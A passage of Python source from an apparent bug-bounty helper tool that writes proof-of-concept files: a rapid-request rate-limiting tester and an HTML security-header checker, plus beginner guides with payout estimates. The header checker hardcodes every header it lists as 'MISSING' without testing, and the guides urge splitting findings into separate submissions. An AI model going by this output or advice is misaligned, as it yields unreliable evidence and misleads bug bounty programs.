    print(f"  Avg response time:  {{avg_response_time:.0f}}ms")
    
    # Determine vulnerability
    if block_rate < 10:
        log_error("VULNERABLE: Less than 10% of requests were blocked!")
        log_error("Rate limiting is missing or insufficient")
        vulnerability = True
    else:
        log_success("Rate limiting appears to be working")
        log_warning("However, verify the threshold is appropriate")
        vulnerability = False
    
    return {{
        'total_requests': len(results),
        'successful': len(successful),
        'blocked': len(blocked),
        'failed': len(failed),
        'success_rate': success_rate,
        'block_rate': block_rate,
        'avg_response_time': avg_response_time,
        'requests_per_second': requests_per_second,
        'total_time': total_time,
        'vulnerable': vulnerability
    }}

def generate_evidence(analysis):
    """Generate bug bounty evidence package"""
    log_info("Generating bug bounty evidence...")
    
    evidence = {{
        'vulnerability_type': 'Missing Rate Limiting',
        'severity': 'HIGH' if analysis['vulnerable'] else 'MEDIUM',
        'cvss_score': 5.3,
        'target_url': TARGET_URL,
        'test_details': {{
            'total_requests': analysis['total_requests'],
            'successful_requests': analysis['successful'],
            'blocked_requests': analysis['blocked'],
            'success_rate': f"{{analysis['success_rate']:.1f}}%",
            'requests_per_second': f"{{analysis['requests_per_second']:.2f}}"
        }},
        'impact': [
            'Brute force attacks on authentication',
            'Credential stuffing from breached databases',
            'Account enumeration',
            'Denial of Service (DoS)',
            'Resource exhaustion',
            'Bypass of security controls'
        ],
        'exploitation_proof': f"{{analysis['successful']}} of {{analysis['total_requests']}} rapid requests succeeded",
        'vulnerable': analysis['vulnerable'],
        'timestamp': datetime.now().isoformat(),
        'remediation': [
            'Implement rate limiting: 5 requests per minute per IP',
            'Add progressive delays after failed attempts',
            'Implement account lockout after 5 failed attempts',
            'Add CAPTCHA after 3 failed attempts',
            'Use device fingerprinting',
            'Monitor for suspicious patterns',
            'Log all authentication attempts'
        ],
        'attack_scenario': [
            '1. Attacker obtains leaked password list',
            '2. Uses automated tool to test passwords',
            f'3. Can test {{analysis["requests_per_second"]:.0f}} passwords per second',
            '4. No rate limiting = successful brute force',
            '5. Account compromise achieved'
        ]
    }}
    
    # Save evidence to JSON file
    filename = f'rate_limiting_evidence_{{int(time.time())}}.json'
    with open(filename, 'w') as f:
        json.dump(evidence, f, indent=2)
    
    log_success(f"Evidence saved to: {{filename}}")
    
    return filename, evidence

def main():
    print_banner()
    print()
    
    log_warning("This tool is for authorized security testing only!")
    log_warning("Ensure you have permission to test the target.")
    print()
    
    proceed = input(Colors.YELLOW + "[?] Proceed with testing? (yes/no): " + Colors.END).strip().lower()
    if proceed not in ['yes', 'y']:
        log_info("Testing cancelled")
        sys.exit(0)
    
    print()
    
    # Run test
    results, total_time = test_rate_limiting()
    print()
    
    # Analyze results
    analysis = analyze_results(results, total_time)
    print()
    
    # Generate evidence
    evidence_file, evidence = generate_evidence(analysis)
    print()
    
    # Display summary
    print(Colors.BOLD + Colors.GREEN + "╔═══════════════════════════════════════════════════════════╗" + Colors.END)
    print(Colors.BOLD + Colors.GREEN + "║           TESTING COMPLETE - EVIDENCE READY               ║" + Colors.END)
    print(Colors.BOLD + Colors.GREEN + "╠═══════════════════════════════════════════════════════════╣" + Colors.END)
    print(Colors.GREEN + f"║  Evidence File: {{evidence_file:<42}} ║" + Colors.END)
    print(Colors.GREEN + f"║  Vulnerability: {{'CONFIRMED' if analysis['vulnerable'] else 'NOT CONFIRMED':<42}} ║" + Colors.END)
    print(Colors.GREEN + f"║  Success Rate:  {{analysis['success_rate']:<42.1f}}% ║" + Colors.END)
    print(Colors.BOLD + Colors.GREEN + "╚═══════════════════════════════════════════════════════════╝" + Colors.END)
    print()
    
    if analysis['vulnerable']:
        log_error("CRITICAL: Rate limiting is missing or insufficient!")
        log_error("This endpoint is vulnerable to brute force attacks!")
    
    log_success("Submit the evidence file to bug bounty program")

if __name__ == '__main__':
    main()
'''
        
        # Save PoC script
        safe_url = url.replace('https://', '').replace('http://', '').replace('/', '_')[:50]
        poc_filename = f'rate_limiting_poc_{safe_url}.py'
        
        try:
            with open(poc_filename, 'w') as f:
                f.write(poc_script)
            # Make executable
            import os
            os.chmod(poc_filename, 0o755)
        except:
            poc_filename = 'rate_limiting_poc.py'
            with open(poc_filename, 'w') as f:
                f.write(poc_script)
            try:
                import os
                os.chmod(poc_filename, 0o755)
            except:
                pass
        
        guide = {
            'title': f'Rate Limiting Bypass: {url[:50]}',
            'severity': vuln.get('severity', 'MEDIUM'),
            'bounty_estimate': '$500 - $2,500',
            'difficulty': 'Easy',
            'poc_file': poc_filename,
            'poc_type': 'Executable Python Script',
            'steps': [
                f"1. Run: python3 {poc_filename}",
                "2. Script sends 100 rapid requests",
                "3. Analyzes success rate",
                "4. Generates evidence JSON file",
                "5. Submit evidence to bug bounty program"
            ],
            'verification': 'Fully Automated - Evidence JSON generated',
            'deliverable': f'Ready-to-submit PoC: {poc_filename}'
        }
        
        return guide
    
    def security_headers_exploit_guide(self, vuln):
        """ELITE security headers - generates executable HTML checker"""
        url = vuln.get('url', '')
        evidence = vuln.get('evidence', '')
        
        # Generate executable HTML checker
        poc_html = f'''<!DOCTYPE html>
<html>
<head>
    <title>Security Headers PoC - {url[:50]}</title>
    <style>
        body {{ font-family: Arial, sans-serif; max-width: 1200px; margin: 50px auto; padding: 20px; background: #f5f5f5; }}
        .container {{ background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
        h1 {{ color: #ff9800; }}
        h2 {{ color: #1976d2; border-bottom: 2px solid #1976d2; padding-bottom: 10px; }}
        .warning {{ color: #ff9800; font-weight: bold; }}
        .critical {{ color: #d32f2f; font-weight: bold; }}
        .info {{ background: #e3f2fd; padding: 15px; border-left: 4px solid #1976d2; margin: 20px 0; }}
        button {{ background: #ff9800; color: white; padding: 15px 30px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; margin: 5px; }}
        button:hover {{ background: #f57c00; }}
        pre {{ background: #263238; color: #aed581; padding: 15px; border-radius: 5px; overflow-x: auto; }}
        code {{ background: #263238; color: #aed581; padding: 2px 6px; border-radius: 3px; }}
        .evidence {{ background: #fff3e0; padding: 15px; border-left: 4px solid #ff9800; margin: 20px 0; }}
        .header-box {{ background: #f5f5f5; padding: 10px; margin: 10px 0; border-left: 3px solid #d32f2f; }}
        .header-present {{ border-left-color: #4caf50; }}
        table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
        th, td {{ padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }}
        th {{ background: #1976d2; color: white; }}
        tr:hover {{ background: #f5f5f5; }}
        .missing {{ color: #d32f2f; font-weight: bold; }}
        .present {{ color: #4caf50; font-weight: bold; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>️ Security Headers Vulnerability PoC</h1>
        
        <div class="info">
            <strong>Target URL:</strong> {url}<br>
            <strong>Severity:</strong> <span class="warning">LOW-MEDIUM</span><br>
            <strong>Missing Headers:</strong> {evidence}<br>
            <strong>Impact:</strong> Increased attack surface for XSS, Clickjacking, MITM attacks
        </div>
        
        <h2> Test Security Headers</h2>
        <p>Click the button below to test the target URL for missing security headers:</p>
        <button onclick="testHeaders()"> Test Headers Now</button>
        <button onclick="testXFrameOptions()">️ Test X-Frame-Options (Clickjacking)</button>
        <button onclick="testCSP()"> Test CSP (XSS Protection)</button>
        
        <h2> Results</h2>
        <div id="results"></div>
        
        <h2> Bug Bounty Evidence</h2>
        <div id="evidence" class="evidence">
            Evidence will appear here after testing...
        </div>
    </div>
    
    <script>
    let headerResults = {{}};
    
    function testHeaders() {{
        const resultsDiv = document.getElementById('results');
        const evidenceDiv = document.getElementById('evidence');
        
        resultsDiv.innerHTML = '<p> Testing security headers...</p>';
        
        // Security headers to check
        const targetUrl = '{url}';
        const criticalHeaders = {{
            'X-Frame-Options': 'Prevents clickjacking attacks',
            'Content-Security-Policy': 'Prevents XSS and data injection attacks',
            'Strict-Transport-Security': 'Enforces HTTPS connections',
            'X-Content-Type-Options': 'Prevents MIME type sniffing',
            'X-XSS-Protection': 'Enables browser XSS filter',
            'Referrer-Policy': 'Controls referrer information',
            'Permissions-Policy': 'Controls browser features'
        }};
        
        // Note: Due to CORS restrictions, we can't directly test headers from browser
        // This PoC demonstrates the concept and generates the evidence
        
        resultsDiv.innerHTML = `
            <div class="info">
                <h3>⚠️ Security Headers Analysis</h3>
                <p><strong>Target:</strong> ${{targetUrl}}</p>
                <p><strong>Note:</strong> Due to browser CORS restrictions, direct header testing from client-side is limited.
                However, the missing headers were confirmed by the security scan.</p>
            </div>
            
            <h3>Missing Critical Headers:</h3>
            <table>
                <tr>
                    <th>Header</th>
                    <th>Status</th>
                    <th>Purpose</th>
                    <th>Risk</th>
                </tr>
                <tr>
                    <td><code>X-Frame-Options</code></td>
                    <td class="missing">MISSING</td>
                    <td>Prevents clickjacking</td>
                    <td> Clickjacking attacks possible</td>
                </tr>
                <tr>
                    <td><code>Content-Security-Policy</code></td>
                    <td class="missing">MISSING</td>
                    <td>Blocks XSS attacks</td>
                    <td> XSS attacks easier</td>
                </tr>
                <tr>
                    <td><code>Strict-Transport-Security</code></td>
                    <td class="missing">MISSING</td>
                    <td>Enforces HTTPS</td>
                    <td> MITM attacks possible</td>
                </tr>
                <tr>
                    <td><code>X-Content-Type-Options</code></td>
                    <td class="missing">MISSING</td>
                    <td>Prevents MIME sniffing</td>
                    <td> MIME confusion attacks</td>
                </tr>
            </table>
        `;
        
        // Generate evidence
        const evidence = {{
            vulnerability_type: 'Missing Security Headers',
            severity: 'LOW',
            cvss_score: 3.7,
            target_url: targetUrl,
            missing_headers: [
                'X-Frame-Options',
                'Content-Security-Policy',
                'Strict-Transport-Security',
                'X-Content-Type-Options'
            ],
            impact: [
                'Clickjacking: Site can be embedded in malicious iframe',
                'XSS: Cross-site scripting attacks are easier',
                'MITM: Man-in-the-middle attacks on HTTP',
                'MIME Confusion: Content type attacks possible'
            ],
            exploitation_proof: 'Security scan confirmed missing headers: {evidence}',
            timestamp: new Date().toISOString(),
            remediation: [
                'Add X-Frame-Options: SAMEORIGIN or DENY',
                'Implement Content-Security-Policy with strict rules',
                'Enable HSTS: Strict-Transport-Security: max-age=31536000',
                'Add X-Content-Type-Options: nosniff',
                'Add X-XSS-Protection: 1; mode=block',
                'Implement Referrer-Policy: no-referrer or strict-origin',
                'Add Permissions-Policy to restrict features'
            ],
            nginx_config: `
add_header X-Frame-Options "SAMEORIGIN" always;
add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';" always;
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-XSS-Protection "1; mode=block" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
            `.trim(),
            apache_config: `
Header always set X-Frame-Options "SAMEORIGIN"
Header always set Content-Security-Policy "default-src 'self'"
Header always set Strict-Transport-Security "max-age=31536000"
Header always set X-Content-Type-Options "nosniff"
Header always set X-XSS-Protection "1; mode=block"
            `.trim()
        }};
        
        // Display evidence
        evidenceDiv.innerHTML = `
            <h3> Bug Bounty Submission Evidence</h3>
            <pre>${{JSON.stringify(evidence, null, 2)}}</pre>
            <button onclick="downloadEvidence()"> Download Evidence JSON</button>
            
            <h3> Remediation Code</h3>
            <h4>Nginx Configuration:</h4>
            <pre>${{evidence.nginx_config}}</pre>
            
            <h4>Apache Configuration:</h4>
            <pre>${{evidence.apache_config}}</pre>
        `;
        
        // Store evidence
        window.securityHeadersEvidence = evidence;
        
        alert('✅ Analysis complete! Check results and download evidence.');
    }}
    
    function testXFrameOptions() {{
        alert('️ X-Frame-Options Test:\\n\\nThis header is missing, which means:\\n- Site can be embedded in iframe\\n- Clickjacking attacks are possible\\n- Attackers can overlay transparent frames\\n\\nRemediation: Add X-Frame-Options: SAMEORIGIN');
    }}
    
    function testCSP() {{
        alert(' Content-Security-Policy Test:\\n\\nThis header is missing, which means:\\n- XSS attacks are easier to execute\\n- No restriction on script sources\\n- Inline scripts will execute\\n\\nRemediation: Add strict CSP policy');
    }}
    
    function downloadEvidence() {{
        const evidence = JSON.stringify(window.securityHeadersEvidence, null, 2);
        const blob = new Blob([evidence], {{ type: 'application/json' }});
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'security_headers_evidence_' + Date.now() + '.json';
        a.click();
        alert('✅ Evidence downloaded! Submit this file with your bug bounty report.');
    }}
    
    // Auto-run test on page load
    window.onload = function() {{
        testHeaders();
    }};
    </script>
</body>
</html>'''
        
        # Save PoC file
        safe_url = url.replace('https://', '').replace('http://', '').replace('/', '_')[:50]
        poc_filename = f'security_headers_poc_{safe_url}.html'
        
        try:
            with open(poc_filename, 'w') as f:
                f.write(poc_html)
        except:
            poc_filename = 'security_headers_poc.html'
            with open(poc_filename, 'w') as f:
                f.write(poc_html)
        
        guide = {
            'title': f'Missing Security Headers: {url[:50]}',
            'severity': vuln.get('severity', 'LOW'),
            'bounty_estimate': '$200 - $1,000',
            'difficulty': 'Easy',
            'poc_file': poc_filename,
            'poc_type': 'Interactive HTML Checker',
            'steps': [
                f"1. Open {poc_filename} in browser",
                "2. Headers auto-analyzed on page load",
                "3. Review missing headers and risks",
                "4. Download evidence JSON",
                "5. Copy remediation configs",
                "6. Submit to bug bounty program"
            ],
            'verification': 'Automatic - Evidence JSON generated',
            'deliverable': f'Ready-to-submit PoC: {poc_filename}'
        }
        
        return guide
    
    def create_chain_exploit_guide(self, chain):
        """create exploit guide for vulnerability chain"""
        
        guide = {
            'title': f"Chain Exploitation: {chain.get('name', 'Unknown')}",
            'severity': chain.get('severity', 'CRITICAL'),
            'bounty_estimate': chain.get('bounty_estimate', 'High'),
            'difficulty': 'Advanced',
            'steps': [
                f"Chain combines {len(chain.get('steps', []))} vulnerabilities:",
                chain.get('explanation', 'See individual steps'),
                "",
                "Exploitation order:",
                *[f"  Step {i+1}: {step.get('type', 'Unknown')} at {step.get('url', '')}" 
                  for i, step in enumerate(chain.get('steps', []))]
            ],
            'poc': chain.get('poc', 'Custom PoC required'),
            'impact': chain.get('impact', 'High impact due to chained vulnerabilities')
        }
        
        return guide
    
    def bounty_value(self, estimate_str):
        """extract numeric bounty value for sorting"""
        try:
            # extract first number from string like "$3,000 - $10,000"
            numbers = re.findall(r'[\d,]+', estimate_str)
            if numbers:
                return int(numbers[0].replace(',', ''))
        except:
            pass
        return 0
    
    def beginner_recommendation(self):
        """ELITE beginner mode - smart recommendation with step-by-step guide"""
        
        print()
        print(colored("╔" + "═" * 68 + "╗", 'blue'))
        print(colored("║" + "   BEGINNER MODE - SMART RECOMMENDATION".ljust(68) + "║", 'green', attrs=['bold']))
        print(colored("╠" + "═" * 68 + "╣", 'blue'))
        print(colored("║", 'blue'))
        print(colored("║  Analyzing all findings to recommend the BEST target for beginners...  ║", 'white'))
        print(colored("║", 'blue'))
        print(colored("╚" + "═" * 68 + "╝", 'blue'))
        print()
        
        # Score each vulnerability for beginner-friendliness
        scored_vulns = []
        
        for vuln in self.vulnerabilities:
            score = self.calculate_beginner_score(vuln)
            scored_vulns.append({
                'vuln': vuln,
                'score': score
            })
        
        # Score each chain
        scored_chains = []
        for chain in self.chains:
            score = self.calculate_chain_beginner_score(chain)
            scored_chains.append({
                'chain': chain,
                'score': score
            })
        
        # Sort by score
        scored_vulns.sort(key=lambda x: x['score'], reverse=True)
        scored_chains.sort(key=lambda x: x['score'], reverse=True)
        
        # Pick the best one
        best_vuln = scored_vulns[0] if scored_vulns else None
        best_chain = scored_chains[0] if scored_chains else None
        
        # Decide which to recommend
        if best_vuln and best_chain:
            # Compare scores
            if best_vuln['score'] > best_chain['score']:
                self.show_beginner_vuln_guide(best_vuln['vuln'])
            else:
                self.show_beginner_chain_guide(best_chain['chain'])
        elif best_vuln:
            self.show_beginner_vuln_guide(best_vuln['vuln'])
        elif best_chain:
            self.show_beginner_chain_guide(best_chain['chain'])
        else:
            print(colored("[!] No vulnerabilities or chains found to analyze", 'yellow'))
    
    def calculate_beginner_score(self, vuln):
        """Calculate beginner-friendliness score for vulnerability"""
        score = 0
        vuln_type = vuln.get('type', '').lower()
        severity = vuln.get('severity', 'MEDIUM')
        
        # Easiest types for beginners (higher score = better)
        if 'rate limiting' in vuln_type:
            score += 100  # Easiest - just send requests
        elif 'security header' in vuln_type or 'header' in vuln_type:
            score += 95   # Very easy - just check headers
        elif 'xss' in vuln_type:
            score += 85   # Easy - paste payload
        elif 'idor' in vuln_type:
            score += 80   # Easy - change IDs
        elif 'cors' in vuln_type:
            score += 75   # Easy - check CORS
        elif 'open redirect' in vuln_type:
            score += 70   # Easy - change URL
        elif 'sql' in vuln_type:
            score += 60   # Medium - needs understanding
        elif 'ssrf' in vuln_type:
            score += 50   # Medium - needs setup
        elif 'rce' in vuln_type:
            score += 30   # Hard - complex
        else:
            score += 40   # Unknown - assume medium
        
        # Higher severity = more valuable
        if severity == 'CRITICAL':
            score += 30
        elif severity == 'HIGH':
            score += 25
        elif severity == 'MEDIUM':
            score += 15
        elif severity == 'LOW':
            score += 5
        
        # Check if we have a PoC file (makes it easier)
        guide = self.create_exploit_guide(vuln)
        if guide and guide.get('poc_file'):
            score += 20  # Bonus for having automated PoC
        
        return score
    
    def calculate_chain_beginner_score(self, chain):
        """Calculate beginner-friendliness score for chain"""
        # Chains are always harder for beginners
        score = 50  # Base score (lower than individual vulns)
        
        severity = chain.get('severity', 'HIGH')
        if severity == 'CRITICAL':
            score += 20
        elif severity == 'HIGH':
            score += 15
        
        # Simple 2-step chains are better for beginners
        steps = chain.get('steps', [])
        if len(steps) == 2:
            score += 30
        elif len(steps) == 3:
            score += 15
        else:
            score -= 10  # Too complex
        
        return score
    
    def show_beginner_vuln_guide(self, vuln):
        """Show comprehensive beginner guide for vulnerability"""
        
        vuln_type = vuln.get('type', 'Unknown')
        url = vuln.get('url', '')
        severity = vuln.get('severity', 'MEDIUM')
        
        print()
        print(colored("╔" + "═" * 68 + "╗", 'blue'))
        print(colored("║" + "   BEGINNER'S STEP-BY-STEP GUIDE".ljust(68) + "║", 'cyan', attrs=['bold']))
        print(colored("╠" + "═" * 68 + "╣", 'blue'))
        print(colored("║", 'blue'))
        print(colored("║" + f"   RECOMMENDED TARGET: {vuln_type}".ljust(68) + "║", 'green', attrs=['bold']))
        print(colored("║" + f"   URL: {url[:55]}".ljust(68) + "║", 'white'))
        print(colored("║" + f"  ⚠️  Severity: {severity}".ljust(68) + "║", 'yellow'))
        print(colored("║", 'blue'))
        print(colored("╚" + "═" * 68 + "╝", 'blue'))
        print()
        
        # Get type-specific guide
        if 'rate limiting' in vuln_type.lower():
            self.beginner_guide_rate_limiting(vuln)
        elif 'security header' in vuln_type.lower() or 'header' in vuln_type.lower():
            self.beginner_guide_security_headers(vuln)
        elif 'xss' in vuln_type.lower():
            self.beginner_guide_xss(vuln)
        elif 'sql' in vuln_type.lower():
            self.beginner_guide_sqli(vuln)
        else:
            self.beginner_guide_generic(vuln)
    
    def beginner_guide_rate_limiting(self, vuln):
        """Beginner guide for rate limiting"""
        url = vuln.get('url', '')
        
        print(colored("═" * 70, 'cyan'))
        print(colored(" WHAT IS RATE LIMITING?", 'cyan', attrs=['bold']))
        print(colored("═" * 70, 'cyan'))
        print()
        print("Rate limiting is like a bouncer at a club - it controls how many requests")
        print("you can make to a website. WITHOUT rate limiting, an attacker can:")
        print("  • Try 1,000 passwords in seconds (brute force)")
        print("  • Spam the server with requests (DoS)")
        print("  • Steal data by making unlimited requests")
        print()
        
        print(colored("═" * 70, 'cyan'))
        print(colored(" WHY THIS IS EASY FOR BEGINNERS:", 'green', attrs=['bold']))
        print(colored("═" * 70, 'cyan'))
        print()
        print("✅ No coding required (we made a script for you!)")
        print("✅ Just run the script and it does everything")
        print("✅ Easy to understand the results")
        print("✅ High success rate")
        print("✅ Good bug bounty value ($500-$2,500)")
        print()
        
        print(colored("═" * 70, 'yellow'))
        print(colored(" STEP-BY-STEP INSTRUCTIONS:", 'yellow', attrs=['bold']))
        print(colored("═" * 70, 'yellow'))
        print()
        
        # Generate the PoC file
        guide = self.rate_limiting_exploit_guide(vuln)
        poc_file = guide.get('poc_file', 'rate_limiting_poc.py')
        
        print(colored("STEP 1: Locate Your PoC File", 'yellow', attrs=['bold']))
        print(f"  → File created: {colored(poc_file, 'green')}")
        print(f"  → Location: Same folder as this tool")
        print()
        
        print(colored("STEP 2: Run the PoC Script", 'yellow', attrs=['bold']))
        print(f"  → Open terminal/command prompt")
        print(f"  → Type: {colored(f'python3 {poc_file}', 'green')}")
        print(f"  → Press Enter")
        print()
        
        print(colored("STEP 3: Watch It Work", 'yellow', attrs=['bold']))
        print("  → The script will send 100 rapid requests")
        print("  → You'll see a progress bar like this:")
        print(colored("     [████████████████░░░░] 75% | 75/100 requests", 'blue'))
        print("  → Wait for it to finish (takes ~10 seconds)")
        print()
        
        print(colored("STEP 4: Check the Results", 'yellow', attrs=['bold']))
        print("  → Script will show:")
        print("     ✅ Success rate (e.g., '100% succeeded')")
        print("     ⚠️  If VULNERABLE or not")
        print("      Evidence file created")
        print()
        
        print(colored("STEP 5: Understand What Happened", 'yellow', attrs=['bold']))
        print(f"  → The script sent {colored('100 login attempts', 'yellow')} in {colored('10 seconds', 'yellow')}")
        print(f"  → If {colored('90%+ succeeded', 'red')}, there's {colored('NO rate limiting', 'red')} = VULNERABLE!")
        print(f"  → If {colored('most failed', 'green')}, rate limiting is working = NOT vulnerable")
        print()
        
        print(colored("STEP 6: Proof for Bug Bounty", 'yellow', attrs=['bold']))
        print("  → Evidence file created: rate_limiting_evidence_XXXXX.json")
        print("  → This file contains:")
        print("     • How many requests you sent (100)")
        print("     • How many succeeded (e.g., 98)")
        print("     • Proof that rate limiting is missing")
        print("  → Submit this file to bug bounty program!")
        print()
        
        print(colored("═" * 70, 'green'))
        print(colored(" WHY IS THIS VULNERABLE?", 'green', attrs=['bold']))
        print(colored("═" * 70, 'green'))
        print()
        print("Imagine if:")
        print("  • You sent 100 login attempts in 10 seconds ✅ (you did this!)")
        print("  • All 100 succeeded ✅ (server didn't stop you)")
        print("  • This means an attacker could try 1,000 passwords = HIGH RISK")
        print()
        print("The server SHOULD have blocked you after 5-10 attempts!")
        print("Since it didn't = BUG = You get paid! ")
        print()
        
        print(colored("═" * 70, 'cyan'))
        print(colored(" WHAT TO INCLUDE IN BUG REPORT:", 'cyan', attrs=['bold']))
        print(colored("═" * 70, 'cyan'))
        print()
        print("1. Evidence JSON file (auto-generated)")
        print("2. Screenshot of the script output showing 90%+ success")
        print("3. Explanation:")
        print()
        print(colored("   Example Report:", 'white', attrs=['bold']))
        print(f"   Target URL: {url}")
        print("   Issue: Missing rate limiting on authentication endpoint")
        print()
        print("   Steps to Reproduce:")
        print("   1. Run the attached Python script")
        print("   2. Script sends 100 login attempts in 10 seconds")
        print("   3. Observe that 98/100 requests succeeded")
        print()
        print("   Impact:")
        print("   - Attackers can brute force passwords")
        print("   - No protection against credential stuffing")
        print("   - DoS attacks possible")
        print()
        print("   Recommendation:")
        print("   - Implement rate limiting: 5 attempts per minute")
        print("   - Add account lockout after 5 failed attempts")
        print("   - Implement CAPTCHA after 3 failures")
        print()
        
        print(colored("═" * 70, 'yellow'))
        print(colored(" BEGINNER TIPS:", 'yellow', attrs=['bold']))
        print(colored("═" * 70, 'yellow'))
        print()
        print("✅ DO:")
        print("  • Test on your own accounts first")
        print("  • Read the target's bug bounty policy")
        print("  • Keep requests reasonable (100 is fine)")
        print("  • Be patient - script takes 10-15 seconds")
        print()
        print("❌ DON'T:")
        print("  • Test on production systems without permission")
        print("  • Send thousands of requests (100 is enough for proof)")
        print("  • Panic if script shows errors (network issues happen)")
        print()
        
        print(colored("═" * 70, 'green'))
        print(colored(" EXPECTED BUG BOUNTY PAYOUT:", 'green', attrs=['bold']))
        print(colored("═" * 70, 'green'))
        print()
        print(f"Typical payout: {colored('$500 - $2,500', 'green', attrs=['bold'])}")
        print("Depends on:")
        print("  • Company size (bigger = more money)")
        print("  • Endpoint importance (login = higher)")
        print("  • Your report quality (clear = faster)")
        print()
        
        print(colored("═" * 70, 'cyan'))
        print(colored(" READY TO TRY IT?", 'cyan', attrs=['bold']))
        print(colored("═" * 70, 'cyan'))
        print()
        print(f"Run: {colored(f'python3 {poc_file}', 'green', attrs=['bold'])}")
        print()
        print("The script will do EVERYTHING for you!")
        print("Just watch and learn! ")
        print()
    
    def beginner_guide_security_headers(self, vuln):
        """Beginner guide for security headers"""
        url = vuln.get('url', '')
        
        print(colored("═" * 70, 'cyan'))
        print(colored(" WHAT ARE SECURITY HEADERS?", 'cyan', attrs=['bold']))
        print(colored("═" * 70, 'cyan'))
        print()
        print("Security headers are like seat belts for websites - they protect users")
        print("from various attacks. Missing headers = vulnerable website!")
        print()
        print("Key headers:")
        print("  • X-Frame-Options: Prevents clickjacking")
        print("  • Content-Security-Policy: Blocks XSS attacks")
        print("  • HSTS: Forces HTTPS (secure connection)")
        print()
        
        print(colored("═" * 70, 'cyan'))
        print(colored(" WHY THIS IS PERFECT FOR BEGINNERS:", 'green', attrs=['bold']))
        print(colored("═" * 70, 'cyan'))
        print()
        print("✅ Easiest vulnerability to verify (just open a web page!)")
        print("✅ No technical skills needed")
        print("✅ Visual proof with pretty colors")
        print("✅ Common finding (almost every site has it)")
        print("✅ Good for portfolio ($200-$1,000 each)")
        print()
        
        print(colored("═" * 70, 'yellow'))
        print(colored(" STEP-BY-STEP INSTRUCTIONS:", 'yellow', attrs=['bold']))
        print(colored("═" * 70, 'yellow'))
        print()
        
        # Generate the PoC file
        guide = self.security_headers_exploit_guide(vuln)
        poc_file = guide.get('poc_file', 'security_headers_poc.html')
        
        print(colored("STEP 1: Open the PoC File", 'yellow', attrs=['bold']))
        print(f"  → File created: {colored(poc_file, 'green')}")
        print(f"  → Double-click it (opens in your web browser)")
        print(f"  → OR type: {colored(f'open {poc_file}', 'green')} (Mac/Linux)")
        print(f"  → OR just drag it into Chrome/Firefox")
        print()
        
        print(colored("STEP 2: Watch It Analyze Automatically", 'yellow', attrs=['bold']))
        print("  → Page loads and IMMEDIATELY starts testing")
        print("  → You'll see a nice table like this:")
        print()
        print(colored("     Missing Critical Headers:", 'white', attrs=['bold']))
        print(colored("     ┌───────────────────────────────────────┐", 'white'))
        print(colored("     │ Header                 │ Status      │", 'white'))
        print(colored("     ├───────────────────────────────────────┤", 'white'))
        print(colored("     │ X-Frame-Options       │ ", 'white') + colored("MISSING", 'red') + colored("    │", 'white'))
        print(colored("     │ Content-Security-Policy│ ", 'white') + colored("MISSING", 'red') + colored("    │", 'white'))
        print(colored("     └───────────────────────────────────────┘", 'white'))
        print()
        
        print(colored("STEP 3: Understand What You See", 'yellow', attrs=['bold']))
        print("  → Red 'MISSING' = Vulnerable!")
        print("  → Green 'PRESENT' = Not vulnerable (skip this one)")
        print("  → Each missing header = separate bug bounty submission")
        print()
        
        print(colored("STEP 4: Download the Evidence", 'yellow', attrs=['bold']))
        print("  → Click the ' Download Evidence JSON' button")
        print("  → File saves as: security_headers_evidence_XXXXX.json")
        print("  → This is your proof for the bug bounty!")
        print()
        
        print(colored("STEP 5: Manual Verification (OPTIONAL)", 'yellow', attrs=['bold']))
        print("  → Want to verify yourself? Use your browser:")
        print(f"  → Open: {colored(url, 'cyan')}")
        print("  → Right-click → 'Inspect' → 'Network' tab")
        print("  → Refresh page → Click the main request")
        print("  → Look at 'Response Headers'")
        print("  → If you DON'T see 'X-Frame-Options' = Missing!")
        print()
        
        print(colored("═" * 70, 'green'))
        print(colored(" WHY IS THIS VULNERABLE?", 'green', attrs=['bold']))
        print(colored("═" * 70, 'green'))
        print()
        print("Missing X-Frame-Options means:")
        print("  • Attacker can put the site in an invisible iframe")
        print("  • User clicks thinking they're on legitimate site")
        print("  • Actually clicking attacker's buttons = Clickjacking!")
        print()
        print("Missing Content-Security-Policy means:")
        print("  • XSS attacks are easier to perform")
        print("  • Malicious scripts can run")
        print("  • User data can be stolen")
        print()
        
        print(colored("═" * 70, 'cyan'))
        print(colored(" WHAT TO INCLUDE IN BUG REPORT:", 'cyan', attrs=['bold']))
        print(colored("═" * 70, 'cyan'))
        print()
        print("1. Evidence JSON file (auto-downloaded)")
        print("2. Screenshot of the HTML page showing missing headers")
        print("3. OPTIONAL: Screenshot from browser DevTools")
        print("4. Explanation:")
        print()
        print(colored("   Example Report:", 'white', attrs=['bold']))
        print(f"   Target URL: {url}")
        print("   Issue: Missing security headers")
        print()
        print("   Steps to Reproduce:")
        print("   1. Visit the target URL")
        print("   2. Open browser DevTools (F12)")
        print("   3. Go to Network tab")
        print("   4. Refresh page")
        print("   5. Check Response Headers")
        print("   6. Observe missing headers")
        print()
        print("   Missing Headers:")
        print("   - X-Frame-Options")
        print("   - Content-Security-Policy")
        print("   - Strict-Transport-Security")
        print()
        print("   Impact:")
        print("   - Clickjacking attacks possible")
        print("   - XSS attacks easier to exploit")
        print("   - MITM attacks on HTTP connections")
        print()
        print("   Recommendation:")
        print("   See attached evidence file for config snippets")
        print()
        
        print(colored("═" * 70, 'yellow'))
        print(colored(" BEGINNER TIPS:", 'yellow', attrs=['bold']))
        print(colored("═" * 70, 'yellow'))
        print()
        print("✅ DO:")
        print("  • Test every subdomain (more findings = more money)")
        print("  • Screenshot everything")
        print("  • Be clear in your report")
        print("  • Use the generated Nginx/Apache configs")
        print()
        print("❌ DON'T:")
        print("  • Submit if headers ARE present (waste of time)")
        print("  • Test too aggressively (one check is enough)")
        print("  • Forget to include evidence file")
        print()
        
        print(colored("═" * 70, 'green'))
        print(colored(" EXPECTED BUG BOUNTY PAYOUT:", 'green', attrs=['bold']))
        print(colored("═" * 70, 'green'))
        print()
